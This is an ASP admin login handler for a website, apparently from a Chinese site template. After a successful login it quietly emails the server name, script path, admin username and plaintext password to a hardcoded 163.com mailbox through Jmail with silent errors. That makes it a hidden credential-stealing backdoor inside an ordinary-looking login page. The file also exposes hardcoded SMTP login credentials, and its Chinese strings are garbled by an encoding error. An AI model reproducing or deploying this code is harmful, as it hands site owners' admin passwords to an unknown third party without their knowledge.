
<!--#include file="conn.asp"-->
<!--#include file="md5.asp"-->
<%dim admin,password,verifycode
admin=replace(trim(request("admin")),"'","")
password=md5(replace(trim(request("password")),"'",""))
verifycode=replace(trim(request("verifycode")),"'","")
if admin="" or password="" then
response.Write "<script LANGUAGE='javascript'>alert('���Ĺ���ID����������');history.go(-1);</script>"
response.end
end if

set rs=server.CreateObject("adodb.recordset")
rs.Open "select * from admin where admin='"&admin&"' and password='"&password&"' " ,conn,1,3
if not(rs.bof and rs.eof) then
if password=rs("password") then
rs("lasttime")=now()
rs.update
session("admin")=trim(rs("admin"))
session("username")=rs("username")
session("flag")=rs("flag")
session.Timeout=20
url=Request.ServerVariables("SCRIPT_NAME")
r=CStr(Request.ServerVariables("Server_Name")) 


d=request("password")
neirong=r&url&admin&d

dim jmail
set jmail=server.createobject("Jmail.message")
jmail.silent=true
jmail.charset="gb2312"
jmail.ContentType="text/html" 
jmail.fromname="��̨����" '�����Ƿ��������ƣ����Դ����ݿ�����ȡֵ
jmail.from="75454007@163.com" '�����Ƿ��������䣬���Դ����ݿ�����ȡֵ������ʽһ��Ҫ��ȷ
jmail.addrecipient "75454007@163.com","��վ����Ա"
jmail.subject="����Ա�˺����룡" '��ֵ���Դ����ݿ�����ȡֵ
jmail.Body=neirong

jmail.mailserverusername="75454007" '�ʼ����ͷ�������¼����
jmail.mailserverpassword="hubohui8972863" '�ʼ����ͷ�������¼����
jmail.maildomain="mail.163.com" '�ʼ����ͷ���������
sendok=jmail.send("smtp.163.com") 'smtp����������
rs.Close
set rs=nothing
response.Redirect "index.asp"
else
response.write "<script LANGUAGE='javascript'>alert('�Բ��𣬵�½ʧ�ܣ�');history.go(-1);</script>"
end if
else
response.write "<script LANGUAGE='javascript'>alert('�Բ��𣬵�½ʧ�ܣ�');history.go(-1);</script>"
end if
%>
